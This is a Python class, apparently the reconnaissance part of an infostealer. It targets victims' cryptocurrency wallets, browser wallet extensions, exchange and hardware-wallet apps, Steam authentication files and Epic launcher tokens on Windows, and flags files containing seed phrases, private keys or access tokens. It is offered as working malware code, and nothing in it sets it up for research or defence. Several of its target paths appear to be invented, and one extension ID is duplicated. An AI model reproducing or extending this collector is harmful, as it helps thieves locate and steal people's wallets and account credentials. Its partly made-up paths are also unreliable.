import os
import json
import sqlite3
import shutil
from pathlib import Path
import zipfile
import base64

class CryptoWalletCollector:
    def __init__(self):
        self.collected_wallets = {}
        
        self.wallet_paths = {
            'browser_extensions': {
                'MetaMask': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn',
                    'edge': r'~\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn',
                    'brave': r'~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn'
                },
                'Phantom': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa',
                    'edge': r'~\AppData\Local\Microsoft\Edge\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa'
                },
                'TronLink': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\ibnejdfjmmkpcnlpebklmnkoeoihofec'
                },
                'Coinbase Wallet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad'
                },
                'Binance Wallet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\fhbohimaelbohpjbbldcngcnapndodjp'
                },
                'Trust Wallet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph'
                },
                'Ronin Wallet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\fnjhmkhhmkbjkkabndcnnogagogbneec'
                },
                'Math Wallet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\afbcbjpbpfadlkmhmclhkeeodmamcflc'
                },
                'Sollet': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\bhhhlbepdkbapadjdnnojkbgioiodbic'
                },
                'Solflare': {
                    'chrome': r'~\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\bhhhlbepdkbapadjdnnojkbgioiodbic'
                }
            },
            'desktop_wallets': {
                'Exodus': r'~\AppData\Roaming\Exodus\exodus.wallet',
                'Electrum': r'~\AppData\Roaming\Electrum\wallets',
                'Atomic Wallet': r'~\AppData\Roaming\atomic\Local Storage\leveldb',
                'Jaxx Liberty': r'~\AppData\Roaming\com.liberty.jaxx\IndexedDB',
                'Coinomi': r'~\AppData\Local\Coinomi\Coinomi\wallets',
                'Guarda': r'~\AppData\Roaming\Guarda\Local Storage\leveldb',
                'BitPay': r'~\AppData\Roaming\BitPay\wallets',
                'WalletWasabi': r'~\AppData\Roaming\WalletWasabi\Client\Wallets',
                'Armory': r'~\AppData\Roaming\Armory\wallets',
                'MultiBit': r'~\AppData\Roaming\MultiBit\multibit.wallet',
                'Bisq': r'~\AppData\Roaming\Bisq\btc_mainnet\wallet',
                'MyEtherWallet': r'~\AppData\Roaming\MyEtherWallet\Local Storage\leveldb',
                'Daedalus': r'~\AppData\Roaming\Daedalus\wallets',
                'Yoroi': r'~\AppData\Roaming\Yoroi\wallets',
                'Nami': r'~\AppData\Roaming\Nami\wallets',
                'Eternl': r'~\AppData\Roaming\Eternl\wallets'
            },
            'gaming_wallets': {
                'Steam': r'~\AppData\Roaming\Steam\ssfn',
                'Origin': r'~\AppData\Roaming\Origin\EntitlementCache',
                'Uplay': r'~\AppData\Local\Ubisoft Game Launcher\settings',
                'Epic Games': r'~\AppData\Local\EpicGamesLauncher\Saved\Config',
                'Battle.net': r'~\AppData\Roaming\Battle.net',
                'GOG Galaxy': r'~\AppData\Local\GOG.com\Galaxy\Configuration',
                'Rockstar Games': r'~\AppData\Local\Rockstar Games\Launcher'
            },
            'exchange_apps': {
                'Binance': r'~\AppData\Roaming\Binance\Local Storage\leveldb',
                'Coinbase': r'~\AppData\Roaming\Coinbase\Local Storage\leveldb',
                'Kraken': r'~\AppData\Roaming\Kraken\Local Storage\leveldb',
                'KuCoin': r'~\AppData\Roaming\KuCoin\Local Storage\leveldb',
                'Huobi': r'~\AppData\Roaming\Huobi\Local Storage\leveldb',
                'OKEx': r'~\AppData\Roaming\OKEx\Local Storage\leveldb',
                'Gate.io': r'~\AppData\Roaming\Gate.io\Local Storage\leveldb',
                'Bitfinex': r'~\AppData\Roaming\Bitfinex\Local Storage\leveldb',
                'Gemini': r'~\AppData\Roaming\Gemini\Local Storage\leveldb',
                'Bitstamp': r'~\AppData\Roaming\Bitstamp\Local Storage\leveldb'
            },
            'hardware_wallet_software': {
                'Ledger Live': r'~\AppData\Roaming\Ledger Live\Local Storage\leveldb',
                'Trezor Suite': r'~\AppData\Roaming\TrezorSuite\Local Storage\leveldb',
                'MyTrezor': r'~\AppData\Roaming\MyTrezor\wallets',
                'Ledger Bridge': r'~\AppData\Roaming\LedgerBridge\Local Storage\leveldb'
            },
            'defi_wallets': {
                'Uniswap': r'~\AppData\Roaming\Uniswap\Local Storage\leveldb',
                'PancakeSwap': r'~\AppData\Roaming\PancakeSwap\Local Storage\leveldb', 
                'SushiSwap': r'~\AppData\Roaming\SushiSwap\Local Storage\leveldb',
                '1inch': r'~\AppData\Roaming\1inch\Local Storage\leveldb',
                'Curve': r'~\AppData\Roaming\Curve\Local Storage\leveldb',
                'Balancer': r'~\AppData\Roaming\Balancer\Local Storage\leveldb',
                'Compound': r'~\AppData\Roaming\Compound\Local Storage\leveldb',
                'Aave': r'~\AppData\Roaming\Aave\Local Storage\leveldb',
                'MakerDAO': r'~\AppData\Roaming\MakerDAO\Local Storage\leveldb',
                'Yearn': r'~\AppData\Roaming\Yearn\Local Storage\leveldb'
            },
            'mobile_emulator_wallets': {
                'BlueStacks MetaMask': r'~\AppData\Local\BlueStacks_nxt\Engine\Android\Data\io.metamask\shared_prefs',
                'NoxPlayer Trust Wallet': r'~\AppData\Local\Nox\Android\data\com.wallet.crypto.trustapp\shared_prefs',
                'MEmu Coinbase': r'~\AppData\Local\MEmu\Android\data\org.toshi\shared_prefs',
                'LDPlayer Phantom': r'~\AppData\Local\LDPlayer\Android\data\app.phantom\shared_prefs'
            },
            'mining_software': {
                'NiceHash Miner': r'~\AppData\Local\NiceHash Miner\configs',
                'Claymore': r'~\AppData\Roaming\Claymore\wallets',
                'PhoenixMiner': r'~\AppData\Roaming\PhoenixMiner\wallets',
                'T-Rex': r'~\AppData\Roaming\T-Rex\configs',
                'TeamRedMiner': r'~\AppData\Roaming\TeamRedMiner\configs',
                'Gminer': r'~\AppData\Roaming\Gminer\configs',
                'NBMiner': r'~\AppData\Roaming\NBMiner\configs',
                'lolMiner': r'~\AppData\Roaming\lolMiner\configs'
            },
            'nft_platforms': {
                'OpenSea': r'~\AppData\Roaming\OpenSea\Local Storage\leveldb',
                'Rarible': r'~\AppData\Roaming\Rarible\Local Storage\leveldb',
                'SuperRare': r'~\AppData\Roaming\SuperRare\Local Storage\leveldb',
                'Foundation': r'~\AppData\Roaming\Foundation\Local Storage\leveldb',
                'AsyncArt': r'~\AppData\Roaming\AsyncArt\Local Storage\leveldb',
                'KnownOrigin': r'~\AppData\Roaming\KnownOrigin\Local Storage\leveldb',
                'MakersPlace': r'~\AppData\Roaming\MakersPlace\Local Storage\leveldb',
                'Nifty Gateway': r'~\AppData\Roaming\NiftyGateway\Local Storage\leveldb'
            }
        }
    
    def collect_all_wallets(self):
        self.collect_browser_extension_wallets()
        self.collect_desktop_wallets()
        self.collect_gaming_wallets()
        self.collect_exchange_apps()
        self.collect_hardware_wallet_software()
        self.collect_defi_wallets()
        self.collect_mobile_emulator_wallets()
        self.collect_mining_software()
        self.collect_nft_platforms()
        
        return self.collected_wallets
    
    def collect_browser_extension_wallets(self):
        for wallet_name, browsers in self.wallet_paths['browser_extensions'].items():
            wallet_data = {}
            
            for browser, path in browsers.items():
                expanded_path = os.path.expanduser(path)
                if os.path.exists(expanded_path):
                    data = self.extract_extension_data(expanded_path)
                    if data:
                        wallet_data[browser] = data
            
            if wallet_data:
                if 'browser_extensions' not in self.collected_wallets:
                    self.collected_wallets['browser_extensions'] = {}
                self.collected_wallets['browser_extensions'][wallet_name] = wallet_data
    
    def extract_extension_data(self, path):
        data = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    file_path = os.path.join(path, file)
                    if file.endswith('.ldb') or file.endswith('.log'):
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                if b'mnemonic' in content or b'seed' in content or b'private' in content:
                                    data.append({
                                        'file': file,
                                        'size': len(content),
                                        'contains_sensitive': True
                                    })
                        except Exception:
                            continue
            return data if data else None
        except Exception:
            return None
    
    def collect_desktop_wallets(self):
        for wallet_name, path in self.wallet_paths['desktop_wallets'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                wallet_data = self.extract_wallet_data(expanded_path, wallet_name)
                if wallet_data:
                    if 'desktop_wallets' not in self.collected_wallets:
                        self.collected_wallets['desktop_wallets'] = {}
                    self.collected_wallets['desktop_wallets'][wallet_name] = wallet_data
    
    def extract_wallet_data(self, path, wallet_name):
        try:
            if wallet_name == 'Exodus':
                return self.extract_exodus_data(path)
            elif wallet_name == 'Electrum':
                return self.extract_electrum_data(path)
            elif wallet_name == 'Atomic Wallet':
                return self.extract_atomic_wallet_data(path)
            elif wallet_name == 'Jaxx Liberty':
                return self.extract_jaxx_data(path)
            else:
                return self.extract_generic_wallet_data(path)
        except Exception:
            return None
    
    def extract_exodus_data(self, path):
        data = {}
        try:
            if os.path.isfile(path):
                with open(path, 'r', encoding='utf-8') as f:
                    wallet_content = f.read()
                    data['wallet_file'] = True
                    data['encrypted'] = 'seed' in wallet_content or 'mnemonic' in wallet_content
            return data
        except Exception:
            return None
    
    def extract_electrum_data(self, path):
        wallets = []
        try:
            if os.path.isdir(path):
                for wallet_file in os.listdir(path):
                    wallet_path = os.path.join(path, wallet_file)
                    if os.path.isfile(wallet_path):
                        try:
                            with open(wallet_path, 'r', encoding='utf-8') as f:
                                wallet_data = json.load(f)
                                wallets.append({
                                    'name': wallet_file,
                                    'encrypted': wallet_data.get('use_encryption', False),
                                    'seed_encrypted': 'seed' in wallet_data
                                })
                        except Exception:
                            continue
            return wallets if wallets else None
        except Exception:
            return None
    
    def extract_atomic_wallet_data(self, path):
        data = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    file_path = os.path.join(path, file)
                    if file.endswith('.ldb'):
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                if b'mnemonic' in content or b'privateKey' in content:
                                    data.append({
                                        'file': file,
                                        'size': len(content),
                                        'type': 'leveldb'
                                    })
                        except Exception:
                            continue
            return data if data else None
        except Exception:
            return None
    
    def extract_jaxx_data(self, path):
        data = []
        try:
            if os.path.isdir(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.leveldb') or 'wallet' in file.lower():
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                    data.append({
                                        'file': file,
                                        'path': file_path,
                                        'size': len(content)
                                    })
                            except Exception:
                                continue
            return data if data else None
        except Exception:
            return None
    
    def extract_generic_wallet_data(self, path):
        try:
            if os.path.isfile(path):
                stat = os.stat(path)
                return {
                    'type': 'file',
                    'size': stat.st_size,
                    'modified': stat.st_mtime
                }
            elif os.path.isdir(path):
                files = []
                for root, dirs, filenames in os.walk(path):
                    for filename in filenames:
                        if any(ext in filename.lower() for ext in ['.wallet', '.dat', '.key', '.json', '.db']):
                            file_path = os.path.join(root, filename)
                            stat = os.stat(file_path)
                            files.append({
                                'name': filename,
                                'path': file_path,
                                'size': stat.st_size,
                                'modified': stat.st_mtime
                            })
                return {'type': 'directory', 'files': files}
            return None
        except Exception:
            return None
    
    def collect_gaming_wallets(self):
        for wallet_name, path in self.wallet_paths['gaming_wallets'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                wallet_data = self.extract_gaming_data(expanded_path, wallet_name)
                if wallet_data:
                    if 'gaming_wallets' not in self.collected_wallets:
                        self.collected_wallets['gaming_wallets'] = {}
                    self.collected_wallets['gaming_wallets'][wallet_name] = wallet_data
    
    def extract_gaming_data(self, path, platform):
        try:
            if platform == 'Steam':
                return self.extract_steam_data(path)
            elif platform == 'Epic Games':
                return self.extract_epic_data(path)
            else:
                return self.extract_generic_wallet_data(path)
        except Exception:
            return None
    
    def extract_steam_data(self, path):
        steam_files = []
        try:
            if os.path.isfile(path):
                with open(path, 'rb') as f:
                    content = f.read()
                    steam_files.append({
                        'type': 'ssfn_file',
                        'size': len(content),
                        'contains_auth': True
                    })
            return steam_files if steam_files else None
        except Exception:
            return None
    
    def extract_epic_data(self, path):
        configs = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    if file.endswith('.ini') or file.endswith('.json'):
                        file_path = os.path.join(path, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                if 'AccessToken' in content or 'RefreshToken' in content:
                                    configs.append({
                                        'file': file,
                                        'contains_tokens': True
                                    })
                        except Exception:
                            continue
            return configs if configs else None
        except Exception:
            return None
    
    def collect_exchange_apps(self):
        for exchange_name, path in self.wallet_paths['exchange_apps'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                exchange_data = self.extract_leveldb_data(expanded_path)
                if exchange_data:
                    if 'exchange_apps' not in self.collected_wallets:
                        self.collected_wallets['exchange_apps'] = {}
                    self.collected_wallets['exchange_apps'][exchange_name] = exchange_data
    
    def collect_hardware_wallet_software(self):
        for wallet_name, path in self.wallet_paths['hardware_wallet_software'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                hw_data = self.extract_leveldb_data(expanded_path)
                if hw_data:
                    if 'hardware_wallet_software' not in self.collected_wallets:
                        self.collected_wallets['hardware_wallet_software'] = {}
                    self.collected_wallets['hardware_wallet_software'][wallet_name] = hw_data
    
    def collect_defi_wallets(self):
        for defi_name, path in self.wallet_paths['defi_wallets'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                defi_data = self.extract_leveldb_data(expanded_path)
                if defi_data:
                    if 'defi_wallets' not in self.collected_wallets:
                        self.collected_wallets['defi_wallets'] = {}
                    self.collected_wallets['defi_wallets'][defi_name] = defi_data
    
    def collect_mobile_emulator_wallets(self):
        for emulator_wallet, path in self.wallet_paths['mobile_emulator_wallets'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                emulator_data = self.extract_android_prefs(expanded_path)
                if emulator_data:
                    if 'mobile_emulator_wallets' not in self.collected_wallets:
                        self.collected_wallets['mobile_emulator_wallets'] = {}
                    self.collected_wallets['mobile_emulator_wallets'][emulator_wallet] = emulator_data
    
    def collect_mining_software(self):
        for miner_name, path in self.wallet_paths['mining_software'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                miner_data = self.extract_miner_configs(expanded_path)
                if miner_data:
                    if 'mining_software' not in self.collected_wallets:
                        self.collected_wallets['mining_software'] = {}
                    self.collected_wallets['mining_software'][miner_name] = miner_data
    
    def collect_nft_platforms(self):
        for nft_platform, path in self.wallet_paths['nft_platforms'].items():
            expanded_path = os.path.expanduser(path)
            if os.path.exists(expanded_path):
                nft_data = self.extract_leveldb_data(expanded_path)
                if nft_data:
                    if 'nft_platforms' not in self.collected_wallets:
                        self.collected_wallets['nft_platforms'] = {}
                    self.collected_wallets['nft_platforms'][nft_platform] = nft_data
    
    def extract_leveldb_data(self, path):
        leveldb_files = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    if file.endswith(('.ldb', '.log', '.sst')):
                        file_path = os.path.join(path, file)
                        try:
                            with open(file_path, 'rb') as f:
                                content = f.read()
                                leveldb_files.append({
                                    'file': file,
                                    'size': len(content),
                                    'type': 'leveldb'
                                })
                        except Exception:
                            continue
            return leveldb_files if leveldb_files else None
        except Exception:
            return None
    
    def extract_android_prefs(self, path):
        prefs = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    if file.endswith('.xml'):
                        file_path = os.path.join(path, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                if 'private_key' in content or 'mnemonic' in content:
                                    prefs.append({
                                        'file': file,
                                        'contains_keys': True
                                    })
                        except Exception:
                            continue
            return prefs if prefs else None
        except Exception:
            return None
    
    def extract_miner_configs(self, path):
        configs = []
        try:
            if os.path.isdir(path):
                for file in os.listdir(path):
                    if file.endswith(('.json', '.conf', '.cfg', '.bat')):
                        file_path = os.path.join(path, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read()
                                if any(keyword in content.lower() for keyword in ['wallet', 'address', 'pool']):
                                    configs.append({
                                        'file': file,
                                        'contains_wallet_info': True
                                    })
                        except Exception:
                            continue
            return configs if configs else None
        except Exception:
            return None
